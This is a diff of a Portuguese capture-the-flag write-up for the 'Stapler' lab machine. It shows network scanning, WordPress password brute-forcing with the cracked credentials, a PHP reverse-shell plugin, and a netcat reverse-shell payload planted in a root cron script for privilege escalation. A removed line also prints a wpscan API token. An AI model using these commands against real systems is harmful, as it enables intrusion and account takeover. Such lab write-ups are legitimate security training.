@@ -1,4 +1,16 @@
-Saída nmap:
+1) Máquina importada no VirtualBox, executo o arp-scan para ver o endereço IP:
+
+```
+root@parrot:~# arp-scan --interface=eth0 192.168.56.0/24                                                                                                      
+Interface: eth0, type: EN10MB, MAC: 08:00:27:79:a6:a0, IPv4: 192.168.56.105                                                                                   
+Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)                                                                                 
+192.168.56.1    0a:00:27:00:00:00       (Unknown: locally administered)                                                                                       
+192.168.56.100  08:00:27:7c:9f:5d       PCS Systemtechnik GmbH                                                                                                
+192.168.56.107  08:00:27:5a:c8:ef       PCS Systemtechnik GmbH
+```
+Está rodando no endereço de final *107*.
+
+2) Rodo o nmap para verificar as portas e serviços:
 ```
 # Nmap 7.80 scan initiated Sun Aug 16 14:25:47 2020 as: nmap -Pn -p- -sV -T5 -A -oN nmap_stapler stapler
 Nmap scan report for stapler (192.168.56.107)
@@ -140,9 +152,13 @@ OS and Service detection performed. Please report any incorrect results at https
 # Nmap done at Sun Aug 16 14:30:22 2020 -- 1 IP address (1 host up) scanned in 280.05 seconds
 ```
 
-Vou resumir, existe muita coisa para enumerar, acesso anônimo ao ftp e smb, o serviço que está rodando na porta 666 (identificar do que o arquivo se trata, extraí-lo e garantir um cookie rsrs) e etc. São muitos usuários, criei um arquivos 'users' e fui colocando cada um lá.
+Vou resumir, existe muita coisa para enumerar, acesso anônimo ao ftp e smb, o serviço que está rodando na porta 666 (identificar do que o arquivo se trata, extraí-lo, ver os metadados e garantir um cookie rsrs) e etc. São muitos usuários, criei um arquivos 'users' e fui colocando um por um lá dentro.
 
-Saída nikto:
+3) Fui direto a porta 80. Lá está executando um serviço web disponibilizado via PHP. Ok, sei que esse tipo de serviço tem as suas especificidades, vou continuar enumerando.
+
+4) Fui até a porta 12380. Nada demais, uma página estática. No código fonte mais um usuário para a lista. Decido tentar algumas coisas com o Burp Suite e... mais um usuário para a lista rs (essa máquina é uma das que são destaques para exames como OSCP, elas tentam retratar a quantidade de serviços/ usuários que uma empresa pode manter). Via _gobuster_ não tenho nenhum retorno, já desconfiava que isso aconteceria pelo erro 'Bad Request' que peguei nas requisições via Burp.
+
+5) Bom, decido executar o nikto e continuar procurando (no passo dois em um dos serviços a serem visualizados, existe uma pasta _backup_ com um wordpress4.tar.gz, guardei isso na mente e continuei...):
 
 ```
 SSL Info:        Subject:  /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost                                                                                  
@@ -151,7 +167,40 @@ Issuer:   /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you mea
 + Entry '/admin112233/' in robots.txt returned a non-forbidden or redirect HTTP code (200)                                                                    
 + Entry '/blogblog/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
 ```
-Usuários no /home:
+6) Bom, como eu não encontrei nada na execução do _gobuster_? A resposta está logo no inicio, o serviço que eu procuro está rodando em _HTTPS_. Encontrei um blog atrás de /blogblog, e como não poderia deixar de ser, é um Wordpress (passo 2 rs).
+
+7) Leio os posts, vou pra cima e vou pra baixo e decido executar o wpscan (sem dúvidas a melhor ferramenta para o caso):
+
+```
+wpscan --url https://192.168.56.107:12380/blogblog/ -e --api-token <token> --disable-tls-checks
+```
+Eu sempre executo com o --api-token (serviço de busca automática de vulnerabilidades do wpvulndb) e por ser uma box antiga, ele trouxe 1001 'problemas' com o CMS. O que me interessa é algo mais incisivo (alguma RCE ou SQL Injection) o que infelizmente não tem. Massss, ele encontra uma lista de usuários, vou tentar uma força-bruta tentando um login na aplicação:
+
+```
+wpscan --url https://192.168.56.107:12380/blogblog/ -e -U wordpress_users -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-500.txt --disable-tls-checks
+```
+
+Depois de um tempo (com algumas wordlists diferentes):
+
+```
+ | Username: garry, Password: football
+ | Username: scott, Password: cookie
+ | Username: tim, Password: thumb
+ | Username: harry, Password: monkey
+| Username: john, Password: incorrect
+```
+
+Logo um por um e temos um administrador, o senhor `john`.
+
+8) Em CTF's já peguei alguns Wordpress, e quando já tenho a autenticação gosto de usar o exploit `unix/webapp/wp_admin_shell_upload` via metasploit (ele automatiza todo o processo, loga, submete um plugin malicioso e retorna um shell) porém não deu certo :(, vou atrás de entender o que está acontecendo e essa instalação pede algumas credenciais para fazer a instalação do plugin (isso via FTP). Bom, mas não tem tudo está perdido, sei que o Wordpress mantém no wp-contents esses conteúdos que se faz upload, vou até 'Media -> Library' e para a minha surpresa está tudo lá.
+
+```
+https://192.168.56.107:12380/blogblog/wp-content/uploads/wordpress-plugin-shell.php
+```
+
+Esse foi um dos 'plugins' que tentei instalar e não consegui, ele estava no diretório dando sopa.
+
+9) Subo um listener netcat e executo o php, logo depois tenho shell no servidor, vou atrás do diretório /home:
 
 ```
 drwxr-xr-x 2 AParnell   AParnell   4096 Jun  5  2016 AParnell
@@ -185,34 +234,19 @@ drwxr-xr-x 3 peter      peter      4096 Jun  3  2016 peter
 drwxrwxrwx 2 www        www        4096 Jun  5  2016 www
 drwxr-xr-x 2 zoe        zoe        4096 Jun  5  2016 zoe
 ```
-```
-wpscan --url https://192.168.56.107:12380/blogblog/ -e --api-token 9aFIpZnrjTuGeWIqSg4cFLM1qAEFlPoVrsbSGR0OTak --disable-tls-checks
-```
 
-```
-wpscan --url https://192.168.56.107:12380/blogblog/ -e -U wordpress_users -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-500.txt --disable-tls-checks
-```
-
-```
-| Username: garry, Password: football
- | Username: garry, Password: football
- | Username: scott, Password: cookie
- | Username: tim, Password: thumb
- | Username: harry, Password: monkey
-| Username: john, Password: incorrect
-```
-
-O lse.sh retornou a seguinte linha:
+É muita gente, executo um find e não encontro nada relevante. Procuro, procuro e nada que me encha os olhos, decido rodar o lse.sh (https://github.com/diego-treitos/linux-smart-enumeration):
 ```
 /etc/cron.d/logrotate: */5 *   * * *   root  /usr/local/sbin/cron-logrotate.sh
 ```
+Interessante, é isso que eu vou aproveitar para escalar os meus privilégios.
 
-Carga para ser colocada no cron-logrotate.sh:
+10) Adiciono a carga no cron-logrotate.sh, subo um listener via netcat e aguardo alguns minutos:
 ```
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.105 1234 >/tmp/f
 ```
 
-Como usuário root e flag final:
+Minutos depois como usuário root e flag final:
 ```
 root@parrot:~# nc -nlvp 1234
 listening on [any] 1234 ...
@@ -242,8 +276,5 @@ wordpress.sql
               `----------`
 b6b545dc11b7a270f4bad23432190c75162c4a2b
 ```
-Estava no menu Media -> Library.
-Chamando o shell reverso:
-```
-https://192.168.56.107:12380/blogblog/wp-content/uploads/wordpress-plugin-shell.php
-```
+
+Bem divertida, segundo o criador existem 2 maneiras de conseguir entrar na máquina e 3 formas para escalar até o root, bom essas foram as que eu encontrei. Até mais.
